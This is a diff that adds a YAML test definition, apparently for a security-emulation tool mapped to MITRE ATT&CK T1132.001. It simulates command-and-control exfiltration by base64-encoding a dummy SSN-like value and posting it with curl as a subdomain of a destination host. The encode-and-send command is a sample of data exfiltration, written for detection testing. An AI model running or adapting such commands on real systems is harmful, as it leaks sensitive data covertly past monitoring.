@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: Base64 Encoded data (freebsd)
+description: |
+    Utilizing a common technique for posting base64 encoded data.
+args:
+    - name: destination_url
+      type: url
+      default: redcanary.com
+    - name: base64_data
+      type: string
+      default: MTExLTExLTExMTE=
+uuid: 2d97c626-7652-449e-a986-b02d9051c298
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1132: Data Encoding'
+    subtechniques:
+        - 'T1132.001: Standard Encoding'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: base64-encoded-data-(freebsd)
+      inline: |
+        echo -n 111-11-1111 | b64encode -r -
+        curl -XPOST {{.Args.base64_data}}.{{.Args.destination_url}}
+      executor: sh
+      cleanup:
+        inline: ""
+        executor: sh
